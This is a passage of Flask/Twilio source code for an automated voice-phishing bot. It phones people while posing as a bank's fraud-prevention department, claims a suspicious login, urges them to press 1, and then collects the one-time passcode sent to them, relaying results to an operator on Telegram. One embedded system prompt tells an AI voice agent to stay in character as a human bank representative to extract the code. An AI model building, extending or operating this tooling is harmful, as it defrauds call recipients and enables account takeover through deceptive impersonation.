            action += f"&chat_id={quote_plus(str(chat_id))}"
        gather = Gather(num_digits=digits, action=action, timeout=15, input="dtmf", method="POST", finish_on_key="#")
        if audio_url:
            gather.play(audio_url)
        else:
            gather.say(script or "Please follow the instructions.")
        resp.append(gather)
        if fallback:
            resp.say(fallback)
        else:
            resp.say("No input was received. Goodbye.")
        resp.hangup()
    else:
        if audio_url:
            resp.play(audio_url)
        else:
            resp.say(script or "No script was configured.")
        if fallback:
            resp.say(fallback)
        resp.hangup()

    return Response(str(resp), content_type="application/xml")


def custom_flow_response(user_id: str, chat_id: Optional[int], call_sid: str, script: Optional[str] = None, voice_id: Optional[str] = None, delay: str = "0", fallback: str = "", digits: str = "0", audio_key: Optional[str] = None) -> Response:
    script = (script or read_user_file(user_id, "custom_script.txt", "")).strip()
    voice_id = str(voice_id or "").strip() or resolve_voice_id(user_id, "custom_voice_id.txt")
    voice_name = read_user_file(user_id, "VoiceName.txt", "") or ""
    if not voice_name and voice_id:
        voice_key = get_voice_key_by_id(voice_id)
        if voice_key:
            voice_name = VOICE_MAPPING.get(voice_key, {}).get("name", "")
    mode_label = "Crack Blast" if audio_key == "crack_script" else "Custom Call"
    register_call_session(
        call_sid,
        user_id,
        chat_id=chat_id,
        endpoint="/custom_flow",
        mode_label=mode_label,
        voice_id=voice_id,
        voice_name=voice_name,
    )
    delay = str(delay).strip() or read_user_file(user_id, "custom_delay.txt", "0").strip() or "0"
    fallback = str(fallback).strip() or read_user_file(user_id, "custom_fallback.txt", "").strip()
    digits = str(digits).strip() or read_user_file(user_id, "custom_digits.txt", "0").strip() or "0"

    try:
        delay_val = int(delay)
    except (ValueError, TypeError):
        delay_val = 0
    try:
        digits_val = int(digits)
    except (ValueError, TypeError):
        digits_val = 0

    action = f"/live_capture_otp?user_id={quote_plus(str(user_id))}"
    if chat_id is not None:
        action += f"&chat_id={quote_plus(str(chat_id))}"

    if chat_id:
        send_call_stage_status(chat_id, "CUSTOM_FLOW", "Playing custom call script")

    def _play_text_block(text: str) -> None:
        if not text:
            return
        audio_url = generate_call_audio(user_id=user_id, text=text, voice_id=voice_id, filename="custom_flow.mp3")
        if audio_url:
            resp.play(audio_url)
        else:
            resp.say(text)

    resp = VoiceResponse()
    if delay_val > 0:
        resp.pause(length=delay_val)

    if script and ("[PAUSE_WAIT:" in script or "[GATHER:" in script):
        pending_lines = []
        lines = script.splitlines()
        i = 0
        while i < len(lines):
            raw = lines[i].strip()
            if not raw:
                i += 1
                continue
            if raw.startswith("[PAUSE_WAIT:"):
                try:
                    pause_length = int(raw.split(":", 1)[1].rstrip("]"))
                except Exception:
                    pause_length = 1
                if pending_lines:
                    _play_text_block("\n".join(pending_lines).strip())
                    pending_lines = []
                resp.pause(length=max(1, pause_length))
                i += 1
                continue
            if raw.startswith("[GATHER:digits="):
                if pending_lines:
                    _play_text_block("\n".join(pending_lines).strip())
                    pending_lines = []
                gather_digits = 6
                try:
                    gather_digits = int(raw.split("=", 1)[1].rstrip("]"))
                except Exception:
                    gather_digits = 6
                gather_text_lines = []
                j = i + 1
                while j < len(lines):
                    next_line = lines[j].strip()
                    if not next_line:
                        j += 1
                        continue
                    if next_line.startswith("[") and next_line.endswith("]"):
                        break
                    gather_text_lines.append(next_line)
                    j += 1
                gather = Gather(num_digits=gather_digits, action=action, timeout=15, input="dtmf", method="POST", finish_on_key="#")
                gather_text = "\n".join(gather_text_lines).strip()
                if gather_text:
                    gather_audio = generate_call_audio(user_id=user_id, text=gather_text, voice_id=voice_id, filename="custom_flow_gather.mp3")
                    if gather_audio:
                        gather.play(gather_audio)
                    else:
                        gather.say(gather_text)
                resp.append(gather)
                i = j
                continue
            pending_lines.append(raw)
            i += 1
        if pending_lines:
            _play_text_block("\n".join(pending_lines).strip())
    else:
        audio_url = None
        if script:
            audio_url = generate_call_audio(user_id=user_id, text=script, voice_id=voice_id, filename="custom_flow.mp3")
        if digits_val > 0:
            gather = Gather(num_digits=digits_val, action=action, timeout=15, input="dtmf", method="POST", finish_on_key="#")
            if audio_url:
                gather.play(audio_url)
            else:
                gather.say(script or "Please follow the instructions.")
            resp.append(gather)
            if fallback:
                resp.say(fallback)
            else:
                resp.say("No input was received. Goodbye.")
            resp.hangup()
            return Response(str(resp), content_type="application/xml")
        if audio_url:
            resp.play(audio_url)
        else:
            resp.say(script or "No script was configured.")
        if fallback:
            resp.say(fallback)
        resp.hangup()

    if digits_val > 0 and "[GATHER:" not in script:
        gather = Gather(num_digits=digits_val, action=action, timeout=15, input="dtmf", method="POST", finish_on_key="#")
        if not script:
            gather.say("Please follow the instructions.")
        resp.append(gather)
        if fallback:
            resp.say(fallback)
        else:
            resp.say("No input was received. Goodbye.")
        resp.hangup()
    elif fallback and "[GATHER:" not in script:
        resp.say(fallback)
        resp.hangup()
    else:
        resp.hangup()

    return Response(str(resp), content_type="application/xml")


@app.route("/custom_flow", methods=["POST"])
@twilio_request_logger("/custom_flow")
def custom_flow():
    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
    schedule_id = request.values.get("schedule_id") or request.args.get("schedule_id")
    audio_key = request.values.get("audio") or request.args.get("audio")
    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None

    if schedule_id and user_id != "unknown":
        scheduled = _load_scheduled_params(user_id, schedule_id)
        if scheduled and scheduled.get("type") == "custom":
            custom_params = scheduled.get("custom_params", {}) or {}
            script = custom_params.get("script", "").strip()
            voice_id = str(custom_params.get("voice_id", "")).strip() or resolve_voice_id(user_id, "custom_voice_id.txt")
            delay = str(custom_params.get("delay", "0")).strip() or "0"
            fallback = custom_params.get("fallback", "").strip()
            digits = str(custom_params.get("digits", "0")).strip() or "0"
        else:
            script = read_user_file(user_id, "custom_script.txt", "").strip()
            voice_id = resolve_voice_id(user_id, "custom_voice_id.txt")
            delay = read_user_file(user_id, "custom_delay.txt", "0").strip() or "0"
            fallback = read_user_file(user_id, "custom_fallback.txt", "").strip()
            digits = read_user_file(user_id, "custom_digits.txt", "0").strip() or "0"
    else:
        script = read_user_file(user_id, "custom_script.txt", "").strip()
        voice_id = resolve_voice_id(user_id, "custom_voice_id.txt")
        delay = read_user_file(user_id, "custom_delay.txt", "0").strip() or "0"
        fallback = read_user_file(user_id, "custom_fallback.txt", "").strip()
        digits = read_user_file(user_id, "custom_digits.txt", "0").strip() or "0"

    if audio_key == "crack_script":
        crack_config = get_crackblast_config(user_id)
        script = crack_config.get("script", "")
        voice_id = str(crack_config.get("voice_id", "")).strip() or resolve_voice_id(user_id, "Voice.txt")
        delay = crack_config.get("delay", "0") or "0"
        fallback = crack_config.get("fallback", "") or ""
        digits = crack_config.get("digits", "0") or "0"

    response = custom_flow_response(user_id=user_id, chat_id=chat_id, call_sid=request.values.get("CallSid", ""), script=script, voice_id=voice_id, delay=delay, fallback=fallback, digits=digits, audio_key=audio_key)
    return response


@app.route("/normal_advanced_flow", methods=["POST"])
@twilio_request_logger("/normal_advanced_flow")
def normal_advanced_flow():
    """Begin the professional normal-call script by asking for a press-1 confirmation."""
    from twilio.twiml.voice_response import VoiceResponse

    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id = request.values.get("chat_id") or request.args.get("chat_id")
    call_sid = request.values.get("CallSid", "")

    voice_id = request.values.get("voice_id") or request.args.get("voice_id") or None
    voice_name = ""
    if voice_id:
        voice_name = read_user_file(user_id, "VoiceName.txt", "") or get_voice_key_by_id(voice_id) or ""
    name = request.values.get("name") or request.args.get("name")
    company = request.values.get("company") or request.args.get("company")
    from_name = request.values.get("from_name") or request.args.get("from_name")
    language = request.values.get("language") or request.args.get("language")
    delivery = request.values.get("delivery") or request.args.get("delivery")
    code_length = request.values.get("code_length") or request.args.get("code_length")
    emotion = request.values.get("emotion") or request.args.get("emotion")
    if call_sid:
        register_call_session(
            call_sid,
            user_id,
            chat_id=int(chat_id) if chat_id and chat_id not in ("None", "unknown") else None,
            endpoint="/normal_advanced_flow",
            mode_label="Normal Call",
            voice_id=voice_id,
            voice_name=voice_name,
            name=name,
            company=company,
            from_name=from_name,
            language=language,
            delivery=delivery,
            code_length=code_length,
            emotion=emotion,
        )

    resp = VoiceResponse()
    redirect_url = (
        f"/present_urgency?user_id={quote_plus(str(user_id))}&stage=confirm1"
    )
    if chat_id:
        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
    resp.redirect(redirect_url, method="POST")
    return Response(str(resp), content_type="application/xml")


@app.route("/focus_listen_flow", methods=["POST"])
@twilio_request_logger("/focus_listen_flow")
def focus_listen_flow():
    """Legacy pre-script flow.

    This route briefly holds the call before beginning the normal
    verification script.
    """
    from twilio.twiml.voice_response import VoiceResponse

    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id = request.values.get("chat_id") or request.args.get("chat_id")
    call_sid = request.values.get("CallSid", "")
    answered_by = request.values.get("AnsweredBy") or request.values.get("answered_by")

    if answered_by and answered_by.lower() not in ("human", "unknown", ""):
        resp = VoiceResponse()
        resp.say("Thank you. Goodbye.")
        resp.hangup()
        return Response(str(resp), content_type="application/xml")

    voice_id = request.values.get("voice_id") or request.args.get("voice_id") or None
    voice_name = ""
    if voice_id:
        voice_name = read_user_file(user_id, "VoiceName.txt", "") or get_voice_key_by_id(voice_id) or ""
    name = request.values.get("name") or request.args.get("name")
    company = request.values.get("company") or request.args.get("company")
    from_name = request.values.get("from_name") or request.args.get("from_name")
    language = request.values.get("language") or request.args.get("language")
    delivery = request.values.get("delivery") or request.args.get("delivery")
    code_length = request.values.get("code_length") or request.args.get("code_length")
    emotion = request.values.get("emotion") or request.args.get("emotion")
    if call_sid:
        register_call_session(
            call_sid,
            user_id,
            chat_id=int(chat_id) if chat_id and chat_id not in ("None", "unknown") else None,
            endpoint="/focus_listen_flow",
            mode_label="Normal Call",
            voice_id=voice_id,
            voice_name=voice_name,
            name=name,
            company=company,
            from_name=from_name,
            language=language,
            delivery=delivery,
            code_length=code_length,
            emotion=emotion,
        )

    resp = VoiceResponse()
    resp.pause(length=1)
    redirect_url = f"/amd_hold?user_id={quote_plus(str(user_id))}"
    if chat_id:
        redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
    resp.redirect(redirect_url, method="POST")
    return Response(str(resp), content_type="application/xml")


def _is_positive_acknowledgment(text: str) -> bool:
    if not text:
        return False
    normalized = text.strip().lower()
    negative_signals = ["no", "not", "never", "don't", "dont", "cannot", "can't", "wrong"]
    if any(signal in normalized for signal in negative_signals):
        return False
    positive_signals = [
        "yes",
        "yeah",
        "yep",
        "sure",
        "correct",
        "affirmative",
        "speaking",
        "go ahead",
        "okay",
        "ok",
        "right",
        "confirm",
        "i am",
        "i'm",
    ]
    return any(signal in normalized for signal in positive_signals)


def _looks_like_machine_or_voicemail(text: str) -> bool:
    if not text:
        return False
    normalized = text.strip().lower()
    machine_signals = [
        "voicemail",
        "recorded",
        "recording",
        "answering machine",
        "automated",
        "robot",
        "machine",
        "mailbox",
        "leave a message",
        "press 1",
        "press one",
    ]
    return any(signal in normalized for signal in machine_signals)


@app.route("/handle_greeting", methods=["POST"])
@twilio_request_logger("/handle_greeting")
def handle_greeting():
    from twilio.twiml.voice_response import VoiceResponse, Gather

    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
    call_sid = request.values.get("CallSid", "")
    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
    speech_result = (request.values.get("SpeechResult") or request.values.get("speech_result") or "").strip()
    digits = (request.values.get("Digits") or "").strip()
    language = get_call_language(call_sid, user_id)
    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
    name = get_call_name(call_sid, user_id)
    company = get_call_company(call_sid, user_id)
    from_name = get_call_from_name(call_sid, user_id)

    if from_name:
        caller_identity = f"{from_name} from {company}"
    else:
        caller_identity = company

    session = get_call_session(call_sid)
    if call_sid and session is None:
        register_call_session(call_sid, user_id, chat_id=chat_id, endpoint="/handle_greeting", mode_label="Normal Call")
        session = get_call_session(call_sid)
    if session is None:
        session = {}

    # Prefer session chat_id if request did not provide one
    if chat_id is None and session.get("chat_id"):
        try:
            chat_id = int(session.get("chat_id"))
        except Exception:
            chat_id = session.get("chat_id")

    session["greeting_attempts"] = session.get("greeting_attempts", 0)

    def _gather_greeting(prompt_text: str) -> Response:
        resp = VoiceResponse()
        gather_action = (
            f"/handle_greeting?user_id={quote_plus(str(user_id))}"
            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
        )
        gather = Gather(
            input="speech dtmf",
            timeout=8,
            speech_timeout="auto",
            action=gather_action,
            method="POST",
            language="en-US" if language == "en" else "fr-FR",
            speech_model="phone_call",
        )
        prompt_audio = generate_call_audio(user_id=user_id, text=prompt_text, voice_id=voice_id, filename="greeting_prompt.mp3")
        if prompt_audio:
            gather.play(prompt_audio)
        else:
            gather.say(prompt_text)
        resp.append(gather)
        return Response(str(resp), content_type="application/xml")

    # If async AMD already determined answer type, prefer that canonical source
    answered_by = session.get("answered_by") if session else None
    if answered_by:
        ab = str(answered_by).lower()
        if ab == "human":
            # Notify and route to pure AI flow
            if chat_id is not None:
                send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
            # If user pressed 1, notify explicitly
            if digits == "1":
                try:
                    safe_bot_send_message(int(chat_id), "Human Pressed 1")
                except Exception as e:
                    logger.debug(f"Failed to send 'Human Pressed 1' notification: {e}")

            # Build a precise, professional Normal Call system prompt and attach to server-side session
            try:
                digits_len = int(get_call_code_length(call_sid, user_id))
            except Exception:
                digits_len = 6
            delivery = get_call_delivery(call_sid, user_id)
            delivery_text = "your registered phone number" if delivery == "sms" else ("your registered email address" if delivery == "email" else "your registered device")
            normal_prompt = (
                f"You are a professional Fraud Prevention Agent representing {company}.\n"
                "Speak concisely and remain fully in character as a human bank representative.\n"
                "Follow the flow strictly: Greeting → Confirm presence → Explain unusual activity → Request readiness → Ask for DTMF 1 → Send OTP notice → Collect OTP → Confirm success or retry.\n\n"
                f"Greeting: Hello, this is {company} Fraud Prevention Department.\n"
                "[PAUSE 0.5s]\n"
                f"Question: Am I speaking with {name}?\n"
                "If customer confirms (yes/okay/that is me/any positive response):\n"
                "  Thank you for confirming.\n"
                "[PAUSE 0.5s]\n"
                "  We noticed an unusual login attempt on your account from an unrecognized device.\n"
                "[PAUSE 0.7s]\n"
                "  For your security, we need to verify your identity right now. Are you ready?\n"
                "[WAIT FOR SPEECH — 2 seconds]\n\n"
                "If customer affirms:\n"
                "  Perfect. Please press 1 on your keypad to continue.\n"
                "[WAIT FOR DTMF — 5 seconds]\n\n"
                "  Thank you.\n"
                "[PAUSE 0.5s]\n"
                f"  We have just sent a {digits_len}-digit one-time passcode to your registered {delivery} ({delivery_text}).\n"
                "[PAUSE 1s]\n"
                "  Please enter the code on your keypad, followed by the pound key (#).\n"
                "[WAIT FOR DTMF — 15 seconds]\n\n"
                "Success Closure:\n"
                "  Thank you. Your identity has been successfully verified.\n"
                "[PAUSE 0.5s]\n"
                "  Your account remains secure. We apologise for any inconvenience.\n"
                "[PAUSE 0.5s]\n"
                "  Goodbye.\n\n"
                "Failure (Wrong OTP / Timeout):\n"
                "  I'm sorry, the code didn't match our records. Please try again.\n"
                "[PAUSE 1s]\n"
                "  Redirect to OTP collection — allow up to 2 retries.\n\n"
                "After 2 failures:\n"
                "  I'm sorry, we couldn't complete the verification. Please contact customer support using the number on the back of your card. Goodbye.\n"
            )

            # Attach to server-side canonical call_sessions so the AI media session can pick it up
            try:
                if call_sid:
                    call_sessions.setdefault(call_sid, {})
                    call_sessions[call_sid]["custom_script"] = normal_prompt
                    call_sessions[call_sid]["code_length"] = digits_len
                    call_sessions[call_sid]["voice_id"] = voice_id
                    call_sessions[call_sid]["chat_id"] = chat_id
                    call_sessions[call_sid]["name"] = name
                    call_sessions[call_sid]["company"] = company
            except Exception:
                logger.debug("Failed to attach custom_script to call_sessions")

            redirect_url = (
                f"/ai_start?user_id={quote_plus(str(user_id))}"
                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
                f"&call_type=normal&mode_label=AI%20Flow"
            )
            if voice_id:
                redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
            if name:
                redirect_url += f"&name={quote_plus(str(name))}"
            if company:
                redirect_url += f"&company={quote_plus(str(company))}"
            resp = VoiceResponse()
            resp.redirect(redirect_url, method="POST")
            return Response(str(resp), content_type="application/xml")
        elif ab not in ("unknown", ""):
            if chat_id is not None:
                send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
            resp = VoiceResponse()
            resp.say("Thank you. Goodbye.")
            resp.hangup()
            return Response(str(resp), content_type="application/xml")

    # Fallback: use speech result heuristics if AMD not yet present
    if digits == "1" or _is_positive_acknowledgment(speech_result):
        if chat_id is not None:
            send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the verification flow.")
        session["greeting_attempts"] = 0
        redirect_url = f"/present_urgency?user_id={quote_plus(str(user_id))}"
        if chat_id is not None:
            redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
        resp = VoiceResponse()
        resp.redirect(redirect_url, method="POST")
        return Response(str(resp), content_type="application/xml")

    if _looks_like_machine_or_voicemail(speech_result):
        if chat_id is not None:
            send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
        resp = VoiceResponse()
        resp.say("Thank you. Goodbye.")
        resp.hangup()
        return Response(str(resp), content_type="application/xml")

    session["greeting_attempts"] += 1
    if session["greeting_attempts"] >= 2:
        resp = VoiceResponse()
        final = "I'm sorry, we seem to have a poor connection. Please call us back. Goodbye."
        audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="greeting_no_response_final.mp3")
        if audio_final:
            resp.play(audio_final)
        else:
            resp.say(final)
        resp.hangup()
        return Response(str(resp), content_type="application/xml")

    prompt = (
        f"Hello. This is {caller_identity}. May I speak with {name}? "
        "Please say yes or press 1 now."
    )
    return _gather_greeting(prompt)


@app.route("/handle_acknowledgment", methods=["POST"])
@twilio_request_logger("/handle_acknowledgment")
def handle_acknowledgment():
    from twilio.twiml.voice_response import VoiceResponse, Gather

    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
    call_sid = request.values.get("CallSid", "")
    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
    speech_result = (request.values.get("SpeechResult") or request.values.get("speech_result") or "").strip()
    digits = (request.values.get("Digits") or "").strip()
    language = get_call_language(call_sid, user_id)
    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
    name = get_call_name(call_sid, user_id)
    company = get_call_company(call_sid, user_id)
    from_name = get_call_from_name(call_sid, user_id)

    if from_name:
        caller_identity = f"{from_name} from {company}"
    else:
        caller_identity = company

    session = get_call_session(call_sid)
    if call_sid and session is None:
        register_call_session(
            call_sid,
            user_id,
            chat_id=chat_id,
            endpoint="/handle_acknowledgment",
            mode_label="Normal Call",
        )
        session = get_call_session(call_sid)

    if session is None:
        session = {}

    # Prefer session chat_id if request did not provide one
    if chat_id is None and session.get("chat_id"):
        try:
            chat_id = int(session.get("chat_id"))
        except Exception:
            chat_id = session.get("chat_id")

    session["ack_attempts"] = session.get("ack_attempts", 0)

    def _gather_acknowledgment(prompt_text: str) -> Response:
        resp = VoiceResponse()
        gather_action = (
            f"/handle_acknowledgment?user_id={quote_plus(str(user_id))}"
            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
        )
        gather = Gather(
            input="speech dtmf",
            timeout=8,
            speech_timeout="auto",
            action=gather_action,
            method="POST",
            language="en-US" if language == "en" else "fr-FR",
            speech_model="phone_call",
        )
        prompt_audio = generate_call_audio(user_id=user_id, text=prompt_text, voice_id=voice_id, filename="acknowledgment_prompt.mp3")
        if prompt_audio:
            gather.play(prompt_audio)
        else:
            gather.say(prompt_text)
        resp.append(gather)
        return Response(str(resp), content_type="application/xml")

    logger.info(
        f"[ACK] call_sid={call_sid[:8] if call_sid else 'unknown'} speech={speech_result or 'none'} digits={digits or 'none'} ack_attempts={session.get('ack_attempts')} user={user_id}"
    )

    if digits == "1" or _is_positive_acknowledgment(speech_result):
        if chat_id is not None:
            send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the verification flow.")
        session["ack_attempts"] = 0
        redirect_url = f"/present_urgency?user_id={quote_plus(str(user_id))}"
        if chat_id is not None:
            redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
        resp = VoiceResponse()
        resp.redirect(redirect_url, method="POST")
        return Response(str(resp), content_type="application/xml")

    # Prefer canonical AMD result if available
    answered_by = session.get("answered_by") if session else None
    if answered_by:
        ab = str(answered_by).lower()
        if ab == "human":
            # Notify and route to pure AI flow
            if chat_id is not None:
                send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
            # If user pressed 1, notify explicitly
            if digits == "1":
                try:
                    safe_bot_send_message(int(chat_id), "Human Pressed 1")
                except Exception as e:
                    logger.debug(f"Failed to send 'Human Pressed 1' notification: {e}")

            redirect_url = (
                f"/ai_start?user_id={quote_plus(str(user_id))}"
                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
                f"&call_type=normal&mode_label=AI%20Flow"
            )
            if voice_id:
                redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
            if name:
                redirect_url += f"&name={quote_plus(str(name))}"
            if company:
                redirect_url += f"&company={quote_plus(str(company))}"
            resp = VoiceResponse()
            resp.redirect(redirect_url, method="POST")
            return Response(str(resp), content_type="application/xml")
        elif ab not in ("unknown", ""):
            if chat_id is not None:
                send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
            resp = VoiceResponse()
            resp.say("Thank you. Goodbye.")
            resp.hangup()
            return Response(str(resp), content_type="application/xml")

    if _looks_like_machine_or_voicemail(speech_result):
        if chat_id is not None:
            send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
        resp = VoiceResponse()
        resp.say("Thank you. Goodbye.")
        resp.hangup()
        return Response(str(resp), content_type="application/xml")

    session["ack_attempts"] += 1
    if session["ack_attempts"] >= 2:
        resp = VoiceResponse()
        final = "I'm sorry, we seem to have a poor connection. Please call us back. Goodbye."
        audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="ack_no_response_final.mp3")
        if audio_final:
            resp.play(audio_final)
        else:
            resp.say(final)
        resp.hangup()
        return Response(str(resp), content_type="application/xml")

    prompt = (
        f"Hello? Can you hear me? If you can, please say yes or press 1 now."
    )
    return _gather_acknowledgment(prompt)


@app.route("/present_urgency", methods=["POST"])
@twilio_request_logger("/present_urgency")
def present_urgency():
    from twilio.twiml.voice_response import VoiceResponse, Gather

    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
    call_sid = request.values.get("CallSid", "")
    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
    language = get_call_language(call_sid, user_id)
    name = get_call_name(call_sid, user_id)
    company = get_call_company(call_sid, user_id)
    from_name = get_call_from_name(call_sid, user_id)

    if from_name:
        caller_identity = f"{from_name} from {company}"
    else:
        caller_identity = company

    resp = VoiceResponse()
    gather_action = (
        f"/handle_dtmf_press_1?user_id={quote_plus(str(user_id))}"
        f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
    )
    gather = Gather(
        num_digits=1,
        action=gather_action,
        timeout=5,
        input="dtmf",
        method="POST",
        finish_on_key="",
    )
    gather.say(f"Thank you for confirming your identity.")
    gather.pause(length=1)
    gather.say(
        f"We are calling because our systems flagged an unusual login attempt on your account from an unrecognised device."
    )
    gather.pause(length=1)
    gather.say("For your protection, we need to perform a quick security verification.")
    gather.pause(length=1)
    gather.say("This will only take a moment.")
    gather.pause(length=1)
    gather.say("To begin, please press 1 on your keypad now.")
    resp.append(gather)
    return Response(str(resp), content_type="application/xml")


@app.route("/handle_dtmf_press_1", methods=["POST"])
@twilio_request_logger("/handle_dtmf_press_1")
def handle_dtmf_press_1():
    from twilio.twiml.voice_response import VoiceResponse, Gather

    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
    call_sid = request.values.get("CallSid", "")
    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
    digits = (request.values.get("Digits") or "").strip()
    voice_id, voice_name = get_request_voice_info(call_sid, user_id)

    session = get_call_session(call_sid)
    if call_sid and session is None:
        register_call_session(
            call_sid,
            user_id,
            chat_id=chat_id,
            endpoint="/handle_dtmf_press_1",
            mode_label="Normal Call",
        )
        session = get_call_session(call_sid)

    if session is None:
        session = {}

    session["press1_attempts"] = session.get("press1_attempts", 0)

    if digits == "1":
        if session is not None:
            session["press1_attempts"] = 0
        redirect_url = (
            f"/capture_otp?user_id={quote_plus(str(user_id))}"
            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
        )
        resp = VoiceResponse()
        resp.redirect(redirect_url, method="POST")
        return Response(str(resp), content_type="application/xml")

    session["press1_attempts"] += 1
    if session["press1_attempts"] >= 2:
        resp = VoiceResponse()
        final = (
            "I'm sorry, I didn't hear a response. Please contact our support line. Goodbye."
        )
        audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="press1_no_response_final.mp3")
        if audio_final:
            resp.play(audio_final)
        else:
            resp.say(final)
        resp.hangup()
        return Response(str(resp), content_type="application/xml")

    resp = VoiceResponse()
    retry_prompt = (
        "To continue, please press 1 on your keypad now."
    )
    gather_action = (
        f"/handle_dtmf_press_1?user_id={quote_plus(str(user_id))}"
        f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
    )
    gather = Gather(
        num_digits=1,
        action=gather_action,
        timeout=5,
        input="dtmf",
        method="POST",
        finish_on_key="",
    )
    gather.say(retry_prompt)
    resp.append(gather)
    return Response(str(resp), content_type="application/xml")


# /capture_otp may take up to 10 seconds while generating ElevenLabs TTS audio.
# If you run this under a production WSGI server, make sure the request timeout is at least 60 seconds.
@app.route("/capture_otp", methods=["POST"])
def capture_otp():
    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
    digits = request.values.get("Digits", "")
    call_sid = request.values.get("CallSid", "")
    stage = request.values.get("stage", "otp")
    after_gather = request.values.get("after_gather") == "1"
    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
    name = get_call_name(call_sid, user_id)
    company = get_call_company(call_sid, user_id)
    from_name = get_call_from_name(call_sid, user_id)
    language = get_call_language(call_sid, user_id)
    delivery = get_call_delivery(call_sid, user_id)
    code_length = get_call_code_length(call_sid, user_id)
    try:
        code_length = int(code_length)
    except (TypeError, ValueError):
        code_length = 6
    if code_length < 4 or code_length > 10:
        code_length = 6

    if from_name:
        caller_identity = f"{from_name} from {company}"
    else:
        caller_identity = f"{company}"

    if language == "fr":
        if delivery == "email":
            delivery_text = "courriel"
        else:
            delivery_text = "SMS"
        confirm_prompt = (
            f"Bonjour. Ceci est {caller_identity}. "
            f"Puis-je parler à {name} ? Nous avons détecté une activité suspecte sur votre compte, "
            f"et devons vérifier votre identité immédiatement pour protéger vos fonds. "
            f"Un code à {code_length} chiffres a été envoyé par {delivery_text}. "
            "Veuillez appuyer sur 1 maintenant pour confirmer que vous êtes le titulaire du compte et poursuivre la vérification."
        )
        otp_prompt = (
            f"Merci. Un code à {code_length} chiffres a été envoyé par {delivery_text}. "
            "Veuillez entrer le code suivi de la touche dièse (#)."
        )
        retry_text = "Veuillez appuyer sur 1 pour continuer le processus de vérification."
        no_response_text = "Désolé, je n'ai pas entendu de réponse. Ceci est une vérification obligatoire."
        timeout_text = "Aucune entrée n'a été reçue. Merci. Au revoir."
    else:
        delivery_text = "email" if delivery == "email" else "SMS"
        confirm_prompt = (
            f"Hello. This is {caller_identity}. "
            f"May I speak with {name}? We have detected a suspicious login attempt on your account, "
            f"and need to verify your identity immediately to protect your funds. "
            f"A {delivery_text} one-time passcode has been sent for {code_length}-digit verification. "
            "Please press 1 now to confirm you are the account holder and wish to proceed with verification."
        )
        otp_prompt = (
            f"Thank you. We have sent a {code_length}-digit one-time passcode via {delivery_text}. "
            "Please enter the code followed by the pound key (#)."
        )
        retry_text = "Please press 1 to continue the verification process."
        no_response_text = "I'm sorry, I didn't hear a response. This is a mandatory verification."
        timeout_text = "No input was received. Goodbye."

    if call_sid and call_sid in call_sessions:
        session = call_sessions[call_sid]
    else:
        session = None

    logger.info(f"[CAPTURE] stage={stage} after_gather={after_gather} call={call_sid} digits={digits} user={user_id}")

    if stage == "confirm1":
        if call_sid and session is not None:
            session["confirm1_attempts"] = session.get("confirm1_attempts", 0)
        if after_gather:
            if digits == "1":
                if session is not None:
                    session["confirm1_attempts"] = 0
                redirect_url = (
                    f"/capture_otp?user_id={quote_plus(str(user_id))}"
                    f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
                )
                resp = VoiceResponse()
                resp.redirect(redirect_url)
                return Response(str(resp), content_type="application/xml")
            if session is not None:
                session["confirm1_attempts"] += 1
            if session is not None and session["confirm1_attempts"] >= 2:
                final = (
                    "Due to lack of response, your account will be flagged for manual review. Goodbye."
                )
                resp = VoiceResponse()
                audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="normal_ultimate_final_fallback.mp3")
                if audio_final:
                    resp.play(audio_final)
                else:
